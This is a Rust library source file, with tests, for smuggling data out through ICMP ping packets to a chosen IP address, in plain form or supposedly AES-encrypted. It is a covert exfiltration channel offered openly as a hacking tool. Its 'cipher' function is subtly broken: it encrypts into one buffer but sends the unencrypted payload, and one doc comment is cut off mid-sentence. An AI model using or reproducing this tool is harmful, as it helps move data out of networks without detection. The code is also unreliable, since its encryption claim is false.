use std::net::IpAddr;
use std::time::Duration;
use openssl::{aes::{AesKey, aes_ige}, rand::rand_bytes};
use openssl::symm::Mode;
use ping::ping;
use std::io::{Result, Error, ErrorKind};

const CIPHER_BLOCK_SIZE: usize = 16;
const PING_CHUNK_SIZE: usize = 24;

/// Config contains the configuration for smuggler ping_plain and ping_cipher functions.
/// It is recommended to use the default config.
///
pub struct Config {
    timeout: Option<Duration>,
    ttl: Option<u32>,
    ident: Option<u16>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            timeout: Some(Duration::from_secs(5)),
            ttl: Some(128),
            ident: None,
        }
     }
}

impl Config {
    /// Creates new configuration from given parameters.
    ///
    pub fn new(timeout: Option<Duration>, ttl: Option<u32>, ident: Option<u16>) -> Self {
        Self{timeout, ttl, ident}
    }
}


/// Smuggles given payload via ping to the given IP address.
/// Payload is sent in plain text - u8 buffer as is.
///
pub fn ping_plain(addr: IpAddr, payload: &[u8], cfg: &Config) -> Result<()> {
    for chunk in payload.chunks(PING_CHUNK_SIZE) {
        let mut array = [0u8; PING_CHUNK_SIZE];
        for i in 0..PING_CHUNK_SIZE {
            if i >= chunk.len() {
                array[i] = b'\0';
            } else {
                array[i] = chunk[i];
            }
        }
        match ping(addr, cfg.timeout, cfg.ttl, cfg.ident, None, Some(&array)) {
            Err(e) => Err(Error::new(ErrorKind::ConnectionAborted, e.to_string())),
            Ok(()) => Ok(()),
        }?;
    }
    Ok(())
}

/// Smuggles given payload via ping to the given IP address.
/// Payload is encrypted with given key. iv is
///
pub fn ping_cipher(addr: IpAddr, payload: &[u8], key: &[u8; 16], cfg: &Config) -> Result<Vec<u8>> {
    let mut payload = payload.to_vec();
    let rest = payload.len() % CIPHER_BLOCK_SIZE;
    if rest != 0 {
        for _ in 0..CIPHER_BLOCK_SIZE-rest {
            payload.push(b'\0');
        }
    }

    let mut cipher: Vec<u8> = vec![0; payload.len()];
    let mut iv: [u8; 32] = [0; 32];
    rand_bytes(&mut iv)?;
    let origin_iv = iv.clone();
    let key = AesKey::new_encrypt(key)
        .or_else(|_| Err(Error::new(ErrorKind::InvalidData, "invalid key")))?;

    aes_ige(&payload, &mut cipher, &key, &mut iv, Mode::Encrypt);

    for chunk in payload.chunks(24) {
        let mut array = [0u8; 24];
        for i in 0..PING_CHUNK_SIZE {
            if i >= chunk.len() {
                array[i] = b'\0';
            } else {
                array[i] = chunk[i];
            }
        }
        match ping(addr, cfg.timeout, cfg.ttl, cfg.ident, None, Some(&array)) {
            Err(e) => Err(Error::new(ErrorKind::ConnectionAborted, e.to_string())),
            Ok(()) => Ok(()),
        }?;
    }
    Ok(origin_iv.to_vec())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;

    #[ignore]
    #[test]
    fn it_should_ping_plain_text() { // NOTE: this test requires elevated privileges
        let message = "This is smuggled message";
        match ping_plain(
            IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
            message.as_bytes(),
            &Config::default()) {
            Ok(()) => assert!(true),
            Err(e) => {
                println!("Error {e}");
                assert!(false);
            },
        };
    }

    #[ignore]
    #[test]
    fn it_should_ping_cipher_text() { // NOTE: this test requires elevated privileges
        let message = "This is smuggled message";
        let mut key: [u8; 16] = [0;16];
        let _ = rand_bytes(&mut key);
        match ping_cipher(
            IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
            message.as_bytes(),
            &key,
            &Config::default()) {
            Ok(iv) => assert_eq!(iv.len(), 32),
            Err(e) => {
                println!("Error {e}");
                assert!(false);
            },
        };
    }

    #[ignore]
    #[test]
    fn it_should_ping_plain_text_for_different_message_length() { // NOTE: this test requires elevated privileges
        let messages = [
            "This is smuggled message",
            "Short",
            "This message will take few pings, but not so many... Happy hacking.",
            "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",
        ];
        for message in messages {
            match ping_plain(
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
                message.as_bytes(),
                &Config::default()) {
                Ok(()) => assert!(true),
                Err(e) => {
                    println!("Error {e}");
                    assert!(false);
                },
            };
        }
    }

    #[ignore]
    #[test]
    fn it_should_ping_cipher_text_for_different_message_length() { // NOTE: this test requires elevated privileges
        let messages = [
            "This is smuggled message",
            "Short",
            "This message will take few pings, but not so many... Happy hacking.",
            "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",
        ];
        let mut key: [u8; 16] = [0;16];
        let _ = rand_bytes(&mut key);
        for message in messages {
            match ping_cipher(
                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),
                message.as_bytes(),
                &key,
                &Config::default()) {
                Ok(iv) => assert_eq!(iv.len(), 32),
                Err(e) => {
                    println!("Error {e}");
                    assert!(false);
                },
            };
        }
    }
}
